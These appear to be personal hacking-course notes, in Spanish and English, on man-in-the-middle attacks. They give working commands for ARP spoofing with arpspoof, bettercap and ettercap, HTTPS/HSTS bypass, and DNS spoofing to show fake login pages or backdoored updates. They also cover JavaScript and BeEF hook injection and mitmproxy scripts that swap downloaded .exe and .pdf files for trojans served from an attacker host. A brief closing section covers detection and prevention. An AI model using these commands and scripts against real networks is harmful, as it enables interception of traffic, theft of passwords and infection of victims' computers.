MITM ATTACKS:  

ARP Spoofing (ARPSPOOF O BETTERCAP):  
ARP address resolution protocol se usa para mapear ip direcionas a los mac  
para ver la tabla arp  
```
arp -a   
```
el ataque consiste en explotar el protocolo arp para que se rescriba la tabla arp en el cliente y ruter para que uno piense que   
somo el ruter y otro que somos la victima de esta forma podemos interseptar los datos  
ARPSPOOF:  
1. Enable Port Forwarding in kali
```
echo 1 > /proc/sys/net/ipv4/ip_forward  
```
2. Spoof the target and router
```
arpspoof -i [interface wlan0] -t [clientIP] [gatewayIP]  
arpspoof -i [interface] -t [gatewayIP] [clientIP]  
```
si coremos arp-a en el ordenador victima veremos que la mac de los ips esta cambiada  
BETTERCAP:  
```
ifconfig  
bettercap -iface eth0   
```
in bettercap console:  
```
net.probe on   
```
descubre cliente conectados a la net tambien activa net.recon que crea una lista con ips y macs por lo que podemos hacer  
```
net.show  
```
arp spoof atack  
```
help arp.spoof  
set arp.spoof.fullduplex true  
set arp.spoof.targets x.x.x.x  
arp.spoof on  
```
para que funcione net.probe y net.recon tienen que estar funcionando  
para capturar todos los datos que fluyen por el ordenador nesecitamos net.sniff  
```
net.sniff on 
```
ahora podemos ver la informacion enviada en http  

script para bettercap podemos poner todos estos comandos en un archivo de texto y guardarlo con extencion .cap para ejecutarlos simultaneamente la proxima vez  
```
net.probe on 
set arp.spoof.fullduplex true  
set arp.spoof.targets x.x.x.x  
arp.spoof on 
net.sniff on 

bettercap -iface eth0 -caplet file.cap  
```

Bypassing HTTPS:  
La forma mas simple es downgrade https to http para eso se usa ssl strip como metodo avanzado pero en bettercap tenemos un caplet que nos ayuda con eso   
pero no cambia todos los https a http  
descargamos el archivo hstshijack y lo movemos a ctrl+L /usr/share/bettercap/caplets/ antes eliminamos el que existe en la carpeta  
para que esto funcione antes de correr net.sniff on coremos   
```
set net.sniff.local true  
```
para capturar datos que incluso sean locales porque despues de usar el caplet la informacion aparecera como si fuera enviada desde nuestro ordenador  
```
script.cap  
net.probe on  
net.recon on  
set arp.spoof.fullduplex true  
set arp.spoof.targets x.x.x.x,x.x.x.x  
arp.spoof on  
set net.sniff.local true  
net.sniff on  
```
Bypassing HTTPS  
```
bettercap -iface eth0 -caplet file.cap  
```
para ver todos los coplets  
```
caplets.show  
```
usamos el caplet  
```
hstshijack/hstshijack  
```
Bypassing HSTS  
la forma de sobrepasar HTST es hacer que el navegador carge una web diferente con algun caracter en el dominio cambiado  
realizamos el ataque igual que antes y si la victima entra usando el buscador en una web capturamos su contraseña  

DNS Spoofing:  
DNS sever convierte los nombres de dominio a los ips de los servidores donde se encuentra la pagina hackeando este podemos  
devolver nuestra web local en vez de la que solicitan  
```
service apache2 start  
ifconfig  
```
podemos ir a nuestra ip para ver la pagina basica y modificar su html  
```
bettercap -iface eth0 -caplet file.cap  
help dns.spoof  
set dns.spoof.all true  
set dns.spoof.domains zsecurity.org,*.zsecurity.org  
dns.spoof on
```
esto funcionara con todas las webs incluso si usan https pero no con hsts podemos usarlo para cambiar la pagina de login  
inllectar codigo malicioso o proporcinar actualizaciones falsas  
- You can use it, for example,
  - when someone is trying to go to a login page and show them a fake page,
  - if they're trying to go to zSecurity, for example, and then just show them another zSecurity website with some malware embedded into it.
  - You can also use it to serve fake updates. So whenever they have a software that's gonna check for updates, we can DNS spoof that request and send them a fake update with a backdoor

Injecting Javascript Code:  
raplace links, replace images, insert html images, hook target browsers to explotation frameworks   
en hstshijack.cap espesificamos el archivo de js en payloads podemos espesificar vaios archivos separando con "," y indicando el path  
el codigo se ejecutara en http, https y en hsts solo si se busca a travez del navegador  
```
bettercap -iface eth0 -caplet file.cap  
hstshijack/hstshijack  
```

WIRESHARK:  
se usa para analizar el trafico que corre por tu interface  
cuando somos MITM usamos wireshark para capturar y analizar el trafico  
si usamos ierodump o otros programas para capturar trafico podemos abrir el archivo en wireshark  
selecionamos el interface que usamos para realizar el ataque  
```
bettercap -iface eth0 -caplet file.cap  
hstshijack/hstshijack  
```
y selecionamos el interface en el programa wireshark para analizar el trafico  
podemos filtrar todo el trafico para ver el http lo mas importante de los aquetes es el Hypertext transfer protocol   
basicamente la informacion enviada  
podemos pulsar boton derecho follow http stream para ver la respuesta al request  
para descubrir usuarios y contraseñas buscamos POST vemos si hay /login  
podemos pulsar CTRL+F nos abre una barra donde podemos buscar informacion en los paquetes capturados  
en bettercap script podemos espesificar que guarde toda la informacion a un archivo que luego podemos analizar  
```
script.cap  
net.probe on  
net.recon on  
set arp.spoof.fullduplex true  
set arp.spoof.targets x.x.x.x,x.x.x.x  
arp.spoof on  
set net.sniff.local true  
set net.sniff.output /root/capturefile.cap  
net.sniff on  
```
Creating a Fake Access Point  
https://github.com/lakinduakash/linux-wifi-hotspot
```
sudo add-apt-repository ppa:lakinduakash/lwh  
sudo apt install linux-wifi-hotspot  
```
Necesitamos un ordenador con internet y un adaptador wifi que pueda repartir internet  
usamos mana-toolkit que se usa para sobrepasar https capturar datos, crear puntos de haceso....  
mana tiene 3 scripts prinsipales pero el que vamos a usar es start-nat-simple que cre AP con acceso a internet  
```
leafpad /etc/mana-toolkit/hostapd-mana.conf  
```
modificamos el interface a nuestro adaptador y ssid que es con que nombre aparecera el punto de aceso 
```
leafpad /usr/share/mana-toolkit/run-mana/start-nat-simple.sh  
```
upstream ponemos el interface que tiene aceso a internet, phy el adaptador que repartira la conexion  
```
bash /usr/share/mana-toolkit/run-mana/start-nat-simple.sh  
```
ahora podemos usar wireshark o man in the midle F para analizar el trafico tenemos que usar la interface   
que esta repartiendo la señal  

## Ettercap
```
leafpad /etc/ettercap/etter.conf
```
Changes
```
ec_uid = 0
ec_gid = 0
-----
Linux
-----
uncoment iptables and iptables IPV6
redir_command_on
redir_command_off
redir6_command_on
redir6_command_off
```
Run Ettercap Text mode
```
to target all host use ///

ettercap -Tq ///
ettercap -Tq -M arp:remote -i eth0 ///

Use grups to spesifi the targets
ettercap -Tq -M arp:remote -i eth0 mac/ip4/ip6/ports mac/ip4/ip6/ports
ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44//
ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44-77//
ettercap -Tq -M arp:remote -i eth0 /10.20.30.1// /10.20.30.44,10.20.30.77//
```
- Ettercap has a number of plugins.
- Plugins can be used to:
  - Auto-add new clients → autoadd.
  - Re-poison clients after arp broadcasts → repoison_arp.
  - DNS spoof targets → dns_spoof.
  - + more.
```
ettercap -Tq -M arp:remote -i eth0 ///
Pres P
autoadd
```
DNS Spoofing Using Etterca
```
leafpad /etc/ettercap/etter.dns
service apache2 start
ettercap -Tq -M arp:remote -i eth0 -S -P dns_spoof /10.20.30.1// /10.20.30.44//
```
One way arp spoofing
```
first the victim ip then the AP ip
ettercap -Tq -M arp:oneway -i eth0 -S /10.20.30.44// /10.20.30.1//
```


## Arp Spofing
![Screenshot 2021-09-17 at 13 25 12](https://user-images.githubusercontent.com/87951795/133774898-9cab0947-39fb-4d9c-bb19-5d9c95f44c16.png)
If the access point implements a way to keep an eye on the ARP tables, for example, of their using a solution like ARP
watch or any other solution that depends on the ARP table to discover ARP spoofing attacks, then the only way to bypass this is to use one way spoofing in one way spoofing.
![Screenshot 2021-09-17 at 13 24 58](https://user-images.githubusercontent.com/87951795/133774907-fe0e1d12-0934-4b4a-9d58-c3957e2d0cf2.png)
So with this method, anything that the victim requests will go through the hacker, but the responses
will come directly to the victim.
This way, the hacker will not be able to see the responses.
So they won't be able to play around with the responses, change the code or inject stuff on the browser.
But the hacker will still be able to capture the requests.
So they're still be able to see the URLs.
They'll still be able to see usernames, passwords, run an dns spoofing attack downgrade https to HTTP.

## mitmproxy
- https://github.com/mitmproxy/mitmproxy
- https://docs.brew.sh/Homebrew-on-Linux

2 Main operation modes:
- Explicit - user connects directly to the proxy.
- Transparent - data is redirected to the proxy

For Testing
Firefox > Preferences > Network > add manual proxy to ip 127.0.0.1 port 8080

```
brew install mitmproxy
```
- run
```
mitmweb
```
in Start the search bar
```
~a .js
~m post
~m get
```
intercept
```
/*
~bs </body>
```
Real word 
- run MITM attak to get in the midle
- config iptables to redirect to MITMPROXY
```
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
TO REMOVE IT
iptables -t nat --flush
```
run mitmweb in transparent mode
```
sudo su
mitmweb -m transparent
```
MitmDump
```
mitmdump -m transparent --modify-body /~s/"</body>"/"<script src='http://ip:3000/hook.js'></script></body>"
```
Python Scripts
```
import mitmproxy

def request(flow):
  print(flow)
  
def response(flow):
  print(flow)
```
```
from mitmproxy import http


def request(flow):

    if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".exe"):
        print("[+] Got an interesting flow.")
        flow.response = http.HTTPResponse.make(301,  "", {"Location": "http://10.20.215.8/file.exe"})
```
Trojan Factory
- https://github.com/z00z/TrojanFactory
Installation:
    - Download AutoIt (https://www.autoitscript.com/site/autoit/downloads/).
    - Install it using wine > wine autoit-v3-setup.exe
    - Clone Trojan Factory: > git clone https://github.com/z00z/TrojanFactory.git
    - You're all set, navigare into TrojanFactory > cd TrojanFactory
    - Run --help for usage > python trojan_factory.py --help

```
import mitmproxy
import subprocess

def request(flow):
	#code to handle request flows
	
	if flow.request.host != "10.20.215.8" and flow.request.pretty_url.endswith(".pdf"):
		print("[+] Got interesting flow")
		
		front_file = flow.request.pretty_url + "#"
		subprocess.call("python /opt/TrojanFactory/tronjan_factory.py -f '" + front_file + "' -e http://10.20.215.8/evil.exe# -o /var/www/html/file.exe -i /root/Downloads/pdf.ico", shell=True)
		
		flow.response = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.20.215.8/file.exe"})
```
```
python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
```
run it
```
mitmdump -s script.py -m transparent
```

mitmproxy_script.py from TrojanFactory  
Modifie this:  
```
IP = "10.20.215.11"
TARGET_TEXTENSIONS = [".exe", ".pdf"]
EVIL_FILE = "http://10.20.215.11/nv.exe"
WEB_ROOT = "/var/www/html/"
SPOOF_EXTENSION = True
```
run it
```
mitmdump -s mitmproxy_script.py -m transparent
```
SSLstrip
- https://github.com/mitmproxy/mitmproxy/tree/v2.0.2/examples/complex
```
mitmdump -s sslstrip.py -m transparent
```
sslstrip.py and mitmproxy_script.py
```
mitmdump -s sslstrip.py -s mitmproxy_script.py -m transparent
```
sslstrip.py and beef hook.js inject
```
mitmdump -s sslstrip.py -m transparent --modify-body /~s/"</body>"/"<script src='http://ip:3000/hook.js'></script></body>"
```

## Detectar Arp Poisoning:  
comprovamos que los mac de las ips son unicos  
```
arp -a  
```
podemos usar la heramienta XArp  

Detectar actividades sospechosas en la red con Wireshark:  
edit - preferences -protocols -arp - detect ARP requests  
de esta forma podemos detectar si algien intenta descubrir todos los dispositivos en la red  
si vemos que una ip envia varios arp request a todos los ips esque esta escaneando la red  
analize - expert information - (vemos warning con duplicate ip y ARP packet storm en note)  
Otra forma es poner tablas Arp Estaticas  

Para prevenir el ataque MITM:  
Usamos HTTPS evrywher plugin  
Usamos VPN  

Bettercap GUI:  
bettercap -iface eth0  
to install it   
ui.update  
run it  
http-ui  
user:pass  

